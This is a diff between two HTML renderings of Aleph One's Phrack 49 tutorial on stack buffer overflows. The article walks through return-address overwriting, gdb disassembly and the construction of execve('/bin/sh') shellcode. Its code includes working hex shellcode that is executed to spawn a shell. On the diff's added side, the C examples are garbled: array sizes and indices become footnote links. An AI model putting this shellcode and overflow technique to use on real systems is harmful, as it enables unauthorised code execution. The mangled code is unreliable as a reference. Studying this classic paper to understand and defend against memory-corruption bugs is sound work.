@@ -3,30 +3,23 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2019-05-01 Wed 03:06 -->
-<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>&lrm;</title>
-<meta name="generator" content="Org mode" />
-<meta name="author" content="Sheng Li" />
+<title>smashstack</title>
+<!-- 2019-05-01 Wed 21:53 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta  name="generator" content="Org-mode" />
+<meta  name="author" content="Sheng Li" />
 <style type="text/css">
  <!--/*--><![CDATA[/*><!--*/
-  .title  { text-align: center;
-             margin-bottom: .2em; }
-  .subtitle { text-align: center;
-              font-size: medium;
-              font-weight: bold;
-              margin-top:0; }
+  .title  { text-align: center; }
   .todo   { font-family: monospace; color: red; }
-  .done   { font-family: monospace; color: green; }
-  .priority { font-family: monospace; color: orange; }
+  .done   { color: green; }
   .tag    { background-color: #eee; font-family: monospace;
             padding: 2px; font-size: 80%; font-weight: normal; }
   .timestamp { color: #bebebe; }
   .timestamp-kwd { color: #5f9ea0; }
-  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
-  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
-  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .center { margin-left: auto; margin-right: auto; text-align: center; }
   .underline { text-decoration: underline; }
   #postamble p, #preamble p { font-size: 90%; margin: .2em; }
   p.verse { margin-left: 3%; }
@@ -53,111 +46,27 @@
     border: 1px solid black;
   }
   pre.src:hover:before { display: inline;}
-  /* Languages per Org manual */
-  pre.src-asymptote:before { content: 'Asymptote'; }
-  pre.src-awk:before { content: 'Awk'; }
-  pre.src-C:before { content: 'C'; }
-  /* pre.src-C++ doesn't work in CSS */
-  pre.src-clojure:before { content: 'Clojure'; }
-  pre.src-css:before { content: 'CSS'; }
-  pre.src-D:before { content: 'D'; }
-  pre.src-ditaa:before { content: 'ditaa'; }
-  pre.src-dot:before { content: 'Graphviz'; }
-  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
   pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
-  pre.src-fortran:before { content: 'Fortran'; }
-  pre.src-gnuplot:before { content: 'gnuplot'; }
-  pre.src-haskell:before { content: 'Haskell'; }
-  pre.src-hledger:before { content: 'hledger'; }
-  pre.src-java:before { content: 'Java'; }
-  pre.src-js:before { content: 'Javascript'; }
-  pre.src-latex:before { content: 'LaTeX'; }
-  pre.src-ledger:before { content: 'Ledger'; }
-  pre.src-lisp:before { content: 'Lisp'; }
-  pre.src-lilypond:before { content: 'Lilypond'; }
-  pre.src-lua:before { content: 'Lua'; }
-  pre.src-matlab:before { content: 'MATLAB'; }
-  pre.src-mscgen:before { content: 'Mscgen'; }
-  pre.src-ocaml:before { content: 'Objective Caml'; }
-  pre.src-octave:before { content: 'Octave'; }
-  pre.src-org:before { content: 'Org mode'; }
-  pre.src-oz:before { content: 'OZ'; }
-  pre.src-plantuml:before { content: 'Plantuml'; }
-  pre.src-processing:before { content: 'Processing.js'; }
-  pre.src-python:before { content: 'Python'; }
-  pre.src-R:before { content: 'R'; }
-  pre.src-ruby:before { content: 'Ruby'; }
-  pre.src-sass:before { content: 'Sass'; }
-  pre.src-scheme:before { content: 'Scheme'; }
-  pre.src-screen:before { content: 'Gnu Screen'; }
-  pre.src-sed:before { content: 'Sed'; }
-  pre.src-sh:before { content: 'shell'; }
-  pre.src-sql:before { content: 'SQL'; }
-  pre.src-sqlite:before { content: 'SQLite'; }
-  /* additional languages in org.el's org-babel-load-languages alist */
-  pre.src-forth:before { content: 'Forth'; }
-  pre.src-io:before { content: 'IO'; }
-  pre.src-J:before { content: 'J'; }
-  pre.src-makefile:before { content: 'Makefile'; }
-  pre.src-maxima:before { content: 'Maxima'; }
-  pre.src-perl:before { content: 'Perl'; }
-  pre.src-picolisp:before { content: 'Pico Lisp'; }
-  pre.src-scala:before { content: 'Scala'; }
-  pre.src-shell:before { content: 'Shell Script'; }
-  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
-  /* additional language identifiers per "defun org-babel-execute"
-       in ob-*.el */
-  pre.src-cpp:before  { content: 'C++'; }
-  pre.src-abc:before  { content: 'ABC'; }
-  pre.src-coq:before  { content: 'Coq'; }
-  pre.src-groovy:before  { content: 'Groovy'; }
-  /* additional language identifiers from org-babel-shell-names in
-     ob-shell.el: ob-shell is the only babel language using a lambda to put
-     the execution function name together. */
-  pre.src-bash:before  { content: 'bash'; }
-  pre.src-csh:before  { content: 'csh'; }
-  pre.src-ash:before  { content: 'ash'; }
-  pre.src-dash:before  { content: 'dash'; }
-  pre.src-ksh:before  { content: 'ksh'; }
-  pre.src-mksh:before  { content: 'mksh'; }
-  pre.src-posh:before  { content: 'posh'; }
-  /* Additional Emacs modes also supported by the LaTeX listings package */
-  pre.src-ada:before { content: 'Ada'; }
-  pre.src-asm:before { content: 'Assembler'; }
-  pre.src-caml:before { content: 'Caml'; }
-  pre.src-delphi:before { content: 'Delphi'; }
-  pre.src-html:before { content: 'HTML'; }
-  pre.src-idl:before { content: 'IDL'; }
-  pre.src-mercury:before { content: 'Mercury'; }
-  pre.src-metapost:before { content: 'MetaPost'; }
-  pre.src-modula-2:before { content: 'Modula-2'; }
-  pre.src-pascal:before { content: 'Pascal'; }
-  pre.src-ps:before { content: 'PostScript'; }
-  pre.src-prolog:before { content: 'Prolog'; }
-  pre.src-simula:before { content: 'Simula'; }
-  pre.src-tcl:before { content: 'tcl'; }
-  pre.src-tex:before { content: 'TeX'; }
-  pre.src-plain-tex:before { content: 'Plain TeX'; }
-  pre.src-verilog:before { content: 'Verilog'; }
-  pre.src-vhdl:before { content: 'VHDL'; }
-  pre.src-xml:before { content: 'XML'; }
-  pre.src-nxml:before { content: 'XML'; }
-  /* add a generic configuration mode; LaTeX export needs an additional
-     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
-  pre.src-conf:before { content: 'Configuration File'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
 
   table { border-collapse:collapse; }
   caption.t-above { caption-side: top; }
   caption.t-bottom { caption-side: bottom; }
   td, th { vertical-align:top;  }
-  th.org-right  { text-align: center;  }
-  th.org-left   { text-align: center;   }
-  th.org-center { text-align: center; }
-  td.org-right  { text-align: right;  }
-  td.org-left   { text-align: left;   }
-  td.org-center { text-align: center; }
+  th.right  { text-align: center;  }
+  th.left   { text-align: center;   }
+  th.center { text-align: center; }
+  td.right  { text-align: right;  }
+  td.left   { text-align: left;   }
+  td.center { text-align: center; }
   dt { font-weight: bold; }
-  .footpara { display: inline; }
+  .footpara:nth-child(2) { display: inline; }
+  .footpara { display: block; }
   .footdef  { margin-bottom: 1em; }
   .figure { padding: 1em; }
   .figure p { text-align: center; }
@@ -177,7 +86,6 @@
     { font-size: 10px; font-weight: bold; white-space: nowrap; }
   .org-info-js_search-highlight
     { background-color: #ffff00; color: #000000; font-weight: bold; }
-  .org-svg { width: 90%; }
   /*]]>*/-->
 </style>
 <link rel="stylesheet" 						   type="text/css" 						   href="https://shengsli.github.io/css/wheatgrass.css">
@@ -186,7 +94,7 @@
 @licstart  The following is the entire license notice for the
 JavaScript code in this tag.
 
-Copyright (C) 2012-2018 Free Software Foundation, Inc.
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
 
 The JavaScript code in this tag is free software: you can
 redistribute it and/or modify it under the terms of the GNU
@@ -227,31 +135,52 @@ for the JavaScript code in this tag.
  }
 /*]]>*///-->
 </script>
-<script type="text/x-mathjax-config">
+<script type="text/javascript" src="http://orgmode.org/mathjax/MathJax.js"></script>
+<script type="text/javascript">
+<!--/*--><![CDATA[/*><!--*/
     MathJax.Hub.Config({
+        // Only one of the two following lines, depending on user settings
+        // First allows browser-native MathML display, second forces HTML/CSS
+        //  config: ["MMLorHTML.js"], jax: ["input/TeX"],
+            jax: ["input/TeX", "output/HTML-CSS"],
+        extensions: ["tex2jax.js","TeX/AMSmath.js","TeX/AMSsymbols.js",
+                     "TeX/noUndefined.js"],
+        tex2jax: {
+            inlineMath: [ ["\\(","\\)"] ],
+            displayMath: [ ['$$','$$'], ["\\[","\\]"], ["\\begin{displaymath}","\\end{displaymath}"] ],
+            skipTags: ["script","noscript","style","textarea","pre","code"],
+            ignoreClass: "tex2jax_ignore",
+            processEscapes: false,
+            processEnvironments: true,
+            preview: "TeX"
+        },
+        showProcessingMessages: true,
         displayAlign: "center",
-        displayIndent: "0em",
+        displayIndent: "2em",
 
-        "HTML-CSS": { scale: 100,
-                        linebreaks: { automatic: "false" },
-                        webFont: "TeX"
-                       },
-        SVG: {scale: 100,
-              linebreaks: { automatic: "false" },
-              font: "TeX"},
-        NativeMML: {scale: 100},
-        TeX: { equationNumbers: {autoNumber: "AMS"},
-               MultLineWidth: "85%",
-               TagSide: "right",
-               TagIndent: ".8em"
+        "HTML-CSS": {
+             scale: 100,
+             availableFonts: ["STIX","TeX"],
+             preferredFont: "TeX",
+             webFont: "TeX",
+             imageFont: "TeX",
+             showMathMenu: true,
+        },
+        MMLorHTML: {
+             prefer: {
+                 MSIE:    "MML",
+                 Firefox: "MML",
+                 Opera:   "HTML",
+                 other:   "HTML"
              }
-});
+        }
+    });
+/*]]>*///-->
 </script>
-<script type="text/javascript"
-        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
 </head>
 <body>
 <div id="content">
+<h1 class="title">smashstack</h1>
 <p>
 .oO Phrack 49 Oo.
 </p>
@@ -266,7 +195,7 @@ File 14 of 16
 
 <p>
 BugTraq, r00t, and Underground.Org
-			 bring you
+             bring you
 </p>
 
 <p>
@@ -276,7 +205,7 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 </p>
 
 <p>
-	by Aleph One
+    by Aleph One
 aleph1@underground.org
 </p>
 
@@ -357,62 +286,62 @@ and stack segments.
 </p>
 
 <p>
-/-------------&#x2013;&#x2014;\  lower
+/&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;\  lower
 </p>
 <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
 
 
 <colgroup>
-<col  class="org-left" />
+<col  class="left" />
 
-<col  class="org-left" />
+<col  class="left" />
 </colgroup>
 <thead>
 <tr>
-<th scope="col" class="org-left">&#xa0;</th>
-<th scope="col" class="org-left">memory</th>
+<th scope="col" class="left">&#xa0;</th>
+<th scope="col" class="left">memory</th>
 </tr>
 
 <tr>
-<th scope="col" class="org-left">Text</th>
-<th scope="col" class="org-left">addresses</th>
+<th scope="col" class="left">Text</th>
+<th scope="col" class="left">addresses</th>
 </tr>
 
 <tr>
-<th scope="col" class="org-left">&#xa0;</th>
+<th scope="col" class="left">&#xa0;</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td class="org-left">(Initialized)</td>
+<td class="left">(Initialized)</td>
 </tr>
 
 <tr>
-<td class="org-left">Data</td>
+<td class="left">Data</td>
 </tr>
 
 <tr>
-<td class="org-left">(Uninitialized)</td>
+<td class="left">(Uninitialized)</td>
 </tr>
 </tbody>
 <tbody>
 <tr>
-<td class="org-left">&#xa0;</td>
+<td class="left">&#xa0;</td>
 </tr>
 
 <tr>
-<td class="org-left">Stack</td>
-<td class="org-left">higher</td>
+<td class="left">Stack</td>
+<td class="left">higher</td>
 </tr>
 
 <tr>
-<td class="org-left">&#xa0;</td>
-<td class="org-left">memory</td>
+<td class="left">&#xa0;</td>
+<td class="left">memory</td>
 </tr>
 </tbody>
 </table>
 <p>
-&#x00ad;------------&#x2013;&#x2014;/  addresses
+&#x00ad;&#x2013;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;/  addresses
 </p>
 
 <p>
@@ -534,11 +463,11 @@ Let us see what the stack looks like in a simple example:
 <p>
 example1.c:
 </p>
-<hr />
+<hr  />
 <p>
 void function(int a, int b, int c) {
-   char buffer1[5];
-   char buffer2[10];
+   char buffer1<sup><a id="fnr.1" name="fnr.1" class="footref" href="#fn.1">1</a></sup>;
+   char buffer2<sup><a id="fnr.2" name="fnr.2" class="footref" href="#fn.2">2</a></sup>;
 }
 </p>
 
@@ -547,7 +476,7 @@ void main() {
   function(1,2,3);
 }
 </p>
-<hr />
+<hr  />
 
 <p>
    To understand what the program does to call function() we compile it with
@@ -604,7 +533,7 @@ function() is called (each space represents a byte):
 bottom of                                                            top of
 memory                                                               memory
            buffer2       buffer1   sfp   ret   a     b     c
-&lt;-&#x2013;&#x2014;   [            ][        ][    ][    ][    ][    ][    ]
+&lt;&#x2014;&#x2014;   [            ][        ][    ][    ][    ][    ][    ]
 </p>
 
 <p>
@@ -627,10 +556,10 @@ advantage to execute arbitrary code?  Lets look at another example:
 <p>
 example2.c
 </p>
-<hr />
+<hr  />
 <p>
 void function(char *str) {
-   char buffer[16];
+   char buffer<sup><a id="fnr.3" name="fnr.3" class="footref" href="#fn.3">3</a></sup>;
 </p>
 
 <p>
@@ -640,20 +569,20 @@ void function(char *str) {
 
 <p>
 void main() {
-  char large<sub>string</sub>[256];
+  char large<sub>string<sup><a id="fnr.4" name="fnr.4" class="footref" href="#fn.4">4</a></sup></sub>;
   int i;
 </p>
 
 <p>
 for( i = 0; i &lt; 255; i++)
-  large<sub>string</sub>[i] = 'A';
+  large<sub>string[i]</sub> = 'A';
 </p>
 
 <p>
   function(large<sub>string</sub>);
 }
 </p>
-<hr />
+<hr  />
 
 <p>
    This is program has a function with a typical buffer overflow coding
@@ -667,7 +596,7 @@ segmentation violation.  Lets see what its stack looks when we call function:
 bottom of                                                            top of
 memory                                                               memory
                   buffer            sfp   ret   *str
-&lt;-&#x2013;&#x2014;          [                ][    ][    ][    ]
+&lt;&#x2014;&#x2014;          [                ][    ][    ][    ]
 </p>
 
 <p>
@@ -678,7 +607,7 @@ stack                                                                 stack
 
 <p>
    What is going on here?  Why do we get a segmentation violation?  Simple.
-strcpy() is coping the contents of *str (larger<sub>string</sub>[]) into buffer[]
+strcpy() is coping the contents of *str (larger<sub>string[]</sub>) into buffer[]
 until a null character is found on the string.  As we can see buffer[] is
 much smaller than *str.  buffer[] is 16 bytes long, and we are trying to stuff
 it with 256 bytes.  This means that all 250 bytes after buffer in the stack
@@ -701,7 +630,7 @@ to our first example and recall what the stack looked like:
 bottom of                                                            top of
 memory                                                               memory
            buffer2       buffer1   sfp   ret   a     b     c
-&lt;-&#x2013;&#x2014;   [            ][        ][    ][    ][    ][    ][    ]
+&lt;&#x2014;&#x2014;   [            ][        ][    ][    ][    ][    ][    ]
 </p>
 
 <p>
@@ -724,11 +653,11 @@ so we add 8 bytes to the return address.  Our code is now:
 <p>
 example3.c:
 </p>
-<hr />
+<hr  />
 <p>
 void function(int a, int b, int c) {
-   char buffer1[5];
-   char buffer2[10];
+   char buffer1<sup><a id="fnr.1.100" name="fnr.1.100" class="footref" href="#fn.1">1</a></sup>;
+   char buffer2<sup><a id="fnr.2.100" name="fnr.2.100" class="footref" href="#fn.2">2</a></sup>;
    int *ret;
 </p>
 
@@ -750,7 +679,7 @@ void main() {
   printf("%d\n",x);
 }
 </p>
-<hr />
+<hr  />
 
 <p>
    What we have done is add 12 to buffer1[]'s address.  This new address is
@@ -759,7 +688,7 @@ the printf call.  How did we know to add 8 to the return address?  We used a
 test value first (for example 1), compiled the program, and then started gdb:
 </p>
 
-<hr />
+<hr  />
 <p>
 [aleph1]$ gdb example3
 GDB is free software and you are welcome to distribute copies of it
@@ -789,7 +718,7 @@ Dump of assembler code for function main:
 0x80004c6 &lt;main+54&gt;:    ret
 0x80004c7 &lt;main+55&gt;:    nop
 </p>
-<hr />
+<hr  />
 
 <p>
    We can see that when calling function() the RET will be 0x8004a8, and we
@@ -824,18 +753,18 @@ memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
 </p>
 
 <p>
-&lt;-&#x2013;&#x2014;   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]
+&lt;&#x2014;&#x2014;   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]
            ^                            |
 </p>
 <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
 
 
 <colgroup>
-<col  class="org-left" />
+<col  class="left" />
 </colgroup>
 <tbody>
 <tr>
-<td class="org-left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">__</span></span></span></span></span></span></span></span></span></span></span></span></span></td>
+<td class="left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">__</span></span></span></span></span></span></span></span></span></span></span></span></span></td>
 </tr>
 </tbody>
 </table>
@@ -852,23 +781,23 @@ The code to spawn a shell in C looks like:
 <p>
 shellcode.c
 </p>
-<hr />
+<hr  />
 <p>
 #include &lt;stdio.h&gt;
 </p>
 
 <p>
 void main() {
-   char *name[2];
+   char *name<sup><a id="fnr.5" name="fnr.5" class="footref" href="#fn.5">5</a></sup>;
 </p>
 
 <p>
-   name[0] = "/bin/sh";
-   name[1] = NULL;
-   execve(name[0], name, NULL);
+   name<sup><a id="fnr.6" name="fnr.6" class="footref" href="#fn.6">6</a></sup> = "/bin/sh";
+   name<sup><a id="fnr.7" name="fnr.7" class="footref" href="#fn.7">7</a></sup> = NULL;
+   execve(name<sup><a id="fnr.6.100" name="fnr.6.100" class="footref" href="#fn.6">6</a></sup>, name, NULL);
 }
 </p>
-<hr />
+<hr  />
 
 <p>
    To find out what does it looks like in assembly we compile it, and start
@@ -878,7 +807,7 @@ reference to dynamic C library that would normally would be linked in at
 load time.
 </p>
 
-<hr />
+<hr  />
 <p>
 [aleph1]$ gcc -o shellcode -ggdb -static shellcode.c
 [aleph1]$ gdb shellcode
@@ -930,13 +859,13 @@ Dump of assembler code for function _<sub>execve</sub>:
 0x80002eb &lt;_<sub>execve</sub>+47&gt;:        nop
 End of assembler dump.
 </p>
-<hr />
+<hr  />
 
 <p>
 Lets try to understand what is going on here. We'll start by studying main:
 </p>
 
-<hr />
+<hr  />
 <p>
 0x8000130 &lt;main&gt;:       pushl  %ebp
 0x8000131 &lt;main+1&gt;:     movl   %esp,%ebp
@@ -950,7 +879,7 @@ space for the local variables. In this case its:
 </p>
 
 <p>
-char *name[2];
+char *name<sup><a id="fnr.5.100" name="fnr.5.100" class="footref" href="#fn.5">5</a></sup>;
 </p>
 
 <p>
@@ -968,7 +897,7 @@ into the first pointer of name[]. This is equivalent to:
 </p>
 
 <p>
-name[0] = "/bin/sh";
+name<sup><a id="fnr.6.100" name="fnr.6.100" class="footref" href="#fn.6">6</a></sup> = "/bin/sh";
 </p>
 
 <p>
@@ -981,7 +910,7 @@ This is equivalent to:
 </p>
 
 <p>
-name[1] = NULL;
+name<sup><a id="fnr.7.100" name="fnr.7.100" class="footref" href="#fn.7">7</a></sup> = NULL;
 </p>
 
 <p>
@@ -1037,7 +966,7 @@ We push the address of the string "/bin/sh" onto the stack.
 Call the library procedure execve().  The call instruction pushes the
 IP onto the stack.
 </p>
-<hr />
+<hr  />
 
 <p>
    Now execve().  Keep in mind we are using a Intel based Linux system.  The
@@ -1048,7 +977,7 @@ arguments to the system call on the registers, and uses a software interrupt
 to jump into kernel mode.
 </p>
 
-<hr />
+<hr  />
 <p>
 0x80002bc &lt;_<sub>execve</sub>&gt;:   pushl  %ebp
 0x80002bd &lt;_<sub>execve</sub>+1&gt;: movl   %esp,%ebp
@@ -1099,7 +1028,7 @@ Copy the address of the null pointer into %edx.
 <p>
 Change into kernel mode.
 </p>
-<hr />
+<hr  />
 
 <p>
 So as we can see there is not much to the execve() system call.  All we need
@@ -1129,7 +1058,7 @@ syscall after the execve syscall.  What does the exit syscall looks like?
 <p>
 exit.c
 </p>
-<hr />
+<hr  />
 <p>
 #include &lt;stdlib.h&gt;
 </p>
@@ -1139,9 +1068,9 @@ void main() {
         exit(0);
 }
 </p>
-<hr />
+<hr  />
 
-<hr />
+<hr  />
 <p>
 [aleph1]$ gcc -o exit -static exit.c
 [aleph1]$ gdb exit
@@ -1167,7 +1096,7 @@ Dump of assembler code for function _exit:
 0x8000363 &lt;<sub>exit</sub>+23&gt;:   nop
 End of assembler dump.
 </p>
-<hr />
+<hr  />
 
 <p>
    The exit syscall will place 0x1 in EAX, place the exit code in EBX,
@@ -1196,22 +1125,22 @@ after the code, and remembering we will place the address of the string,
 and null word after the array, we have:
 </p>
 
-<hr />
+<hr  />
 <p>
-	movl   string<sub>addr,string</sub><sub>addr</sub><sub>addr</sub>
+    movl   string<sub>addr</sub>,string<sub>addr</sub><sub>addr</sub>
 movb   $0x0,null<sub>byte</sub><sub>addr</sub>
-	movl   $0x0,null<sub>addr</sub>
-	movl   $0xb,%eax
-	movl   string<sub>addr</sub>,%ebx
-	leal   string<sub>addr</sub>,%ecx
-	leal   null<sub>string</sub>,%edx
-	int    $0x80
-	movl   $0x1, %eax
-	movl   $0x0, %ebx
+    movl   $0x0,null<sub>addr</sub>
+    movl   $0xb,%eax
+    movl   string<sub>addr</sub>,%ebx
+    leal   string<sub>addr</sub>,%ecx
+    leal   null<sub>string</sub>,%edx
+    int    $0x80
+    movl   $0x1, %eax
+    movl   $0x0, %ebx
 int    $0x80
-	/bin/sh string goes here.
+    /bin/sh string goes here.
 </p>
-<hr />
+<hr  />
 
 <p>
    The problem is that we don't know where in the memory space of the 
@@ -1237,51 +1166,51 @@ memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
 </p>
 
 <p>
-&lt;-&#x2013;&#x2014;   [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]
+&lt;&#x2014;&#x2014;   [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]
            ^|^             ^|            |
 </p>
 <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
 
 
 <colgroup>
-<col  class="org-left" />
+<col  class="left" />
 
-<col  class="org-left" />
+<col  class="left" />
 
-<col  class="org-left" />
+<col  class="left" />
 
-<col  class="org-left" />
+<col  class="left" />
 
-<col  class="org-left" />
+<col  class="left" />
 
-<col  class="org-left" />
+<col  class="left" />
 </colgroup>
 <tbody>
 <tr>
-<td class="org-left">&#xa0;</td>
-<td class="org-left">&#xa0;</td>
-<td class="org-left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">_</span></span></span></span></span></span></td>
-<td class="org-left">&#xa0;</td>
-<td class="org-left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">__</span></span></span></span></span></td>
-<td class="org-left">(1)</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">_</span></span></span></span></span></span></td>
+<td class="left">&#xa0;</td>
+<td class="left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">__</span></span></span></span></span></td>
+<td class="left">(1)</td>
 </tr>
 </tbody>
 </table>
 <p>
-(2)  ||_____________||
+(2)  ||____________<sub>||</sub>
 </p>
 <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
 
 
 <colgroup>
-<col  class="org-left" />
+<col  class="left" />
 
-<col  class="org-left" />
+<col  class="left" />
 </colgroup>
 <tbody>
 <tr>
-<td class="org-left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">__</span></span></span></span></span></span></td>
-<td class="org-left">(3)</td>
+<td class="left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">__</span></span></span></span></span></span></td>
+<td class="left">(3)</td>
 </tr>
 </tbody>
 </table>
@@ -1297,25 +1226,25 @@ stack                                                                 stack
 many bytes each instruction takes our code looks like:
 </p>
 
-<hr />
+<hr  />
 <p>
-	jmp    offset-to-call           # 2 bytes
-	popl   %esi                     # 1 byte
-	movl   %esi,array-offset(%esi)  # 3 bytes
-	movb   $0x0,nullbyteoffset(%esi)# 4 bytes
-	movl   $0x0,null-offset(%esi)   # 7 bytes
-	movl   $0xb,%eax                # 5 bytes
-	movl   %esi,%ebx                # 2 bytes
-	leal   array-offset,(%esi),%ecx # 3 bytes
-	leal   null-offset(%esi),%edx   # 3 bytes
-	int    $0x80                    # 2 bytes
-	movl   $0x1, %eax		# 5 bytes
-	movl   $0x0, %ebx		# 5 bytes
-int    $0x80			# 2 bytes
-	call   offset-to-popl           # 5 bytes
-	/bin/sh string goes here.
+    jmp    offset-to-call           # 2 bytes
+    popl   %esi                     # 1 byte
+    movl   %esi,array-offset(%esi)  # 3 bytes
+    movb   $0x0,nullbyteoffset(%esi)# 4 bytes
+    movl   $0x0,null-offset(%esi)   # 7 bytes
+    movl   $0xb,%eax                # 5 bytes
+    movl   %esi,%ebx                # 2 bytes
+    leal   array-offset,(%esi),%ecx # 3 bytes
+    leal   null-offset(%esi),%edx   # 3 bytes
+    int    $0x80                    # 2 bytes
+    movl   $0x1, %eax        # 5 bytes
+    movl   $0x0, %ebx        # 5 bytes
+int    $0x80            # 2 bytes
+    call   offset-to-popl           # 5 bytes
+    /bin/sh string goes here.
 </p>
-<hr />
+<hr  />
 
 <p>
    Calculating the offsets from jmp to call, from call to popl, from
@@ -1323,25 +1252,25 @@ the string address to the array, and from the string address to the null
 long word, we now have:
 </p>
 
-<hr />
+<hr  />
 <p>
-	jmp    0x26                     # 2 bytes
-	popl   %esi                     # 1 byte
-	movl   %esi,0x8(%esi)           # 3 bytes
-	movb   $0x0,0x7(%esi)		# 4 bytes
-	movl   $0x0,0xc(%esi)           # 7 bytes
-	movl   $0xb,%eax                # 5 bytes
-	movl   %esi,%ebx                # 2 bytes
-	leal   0x8(%esi),%ecx           # 3 bytes
-	leal   0xc(%esi),%edx           # 3 bytes
-	int    $0x80                    # 2 bytes
-	movl   $0x1, %eax		# 5 bytes
-	movl   $0x0, %ebx		# 5 bytes
-int    $0x80			# 2 bytes
-	call   -0x2b                    # 5 bytes
-	.string \"/bin/sh\"		# 8 bytes
+    jmp    0x26                     # 2 bytes
+    popl   %esi                     # 1 byte
+    movl   %esi,0x8(%esi)           # 3 bytes
+    movb   $0x0,0x7(%esi)        # 4 bytes
+    movl   $0x0,0xc(%esi)           # 7 bytes
+    movl   $0xb,%eax                # 5 bytes
+    movl   %esi,%ebx                # 2 bytes
+    leal   0x8(%esi),%ecx           # 3 bytes
+    leal   0xc(%esi),%edx           # 3 bytes
+    int    $0x80                    # 2 bytes
+    movl   $0x1, %eax        # 5 bytes
+    movl   $0x0, %ebx        # 5 bytes
+int    $0x80            # 2 bytes
+    call   -0x2b                    # 5 bytes
+    .string \"/bin/sh\"        # 8 bytes
 </p>
-<hr />
+<hr  />
 
 <p>
    Looks good. To make sure it works correctly we must compile it and run it.
@@ -1356,7 +1285,7 @@ compile it first, and then use gdb to obtain it.
 <p>
 shellcodeasm.c
 </p>
-<hr />
+<hr  />
 <p>
 void main() {
 _<sub>asm</sub>_<sub>("
@@ -1378,9 +1307,9 @@ _<sub>asm</sub>_<sub>("
 ")</sub>;
 }
 </p>
-<hr />
+<hr  />
 
-<hr />
+<hr  />
 <p>
 [aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
 [aleph1]$ gdb shellcodeasm
@@ -1421,18 +1350,18 @@ End of assembler dump.
 .
 .
 </p>
-<hr />
+<hr  />
 
 <p>
 testsc.c
 </p>
-<hr />
+<hr  />
 <p>
 char shellcode[] =
-	"\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
-	"\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
-	"\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
-	"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
+    "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
+    "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+    "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
+    "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
 </p>
 
 <p>
@@ -1448,15 +1377,15 @@ ret = (int *)&amp;ret + 2;
 <p>
 }
 </p>
-<hr />
-<hr />
+<hr  />
+<hr  />
 <p>
 [aleph1]$ gcc -o testsc testsc.c
 [aleph1]$ ./testsc
 $ exit
 [aleph1]$
 </p>
-<hr />
+<hr  />
 
 <p>
    It works! But there is an obstacle.  In most cases we'll be trying to
@@ -1469,23 +1398,23 @@ eliminate the bytes (and at the same time make it smaller).
 <p>
 Problem instruction:                 Substitute with:
 </p>
-<hr />
+<hr  />
 <p>
-	movb   $0x0,0x7(%esi)                xorl   %eax,%eax
+    movb   $0x0,0x7(%esi)                xorl   %eax,%eax
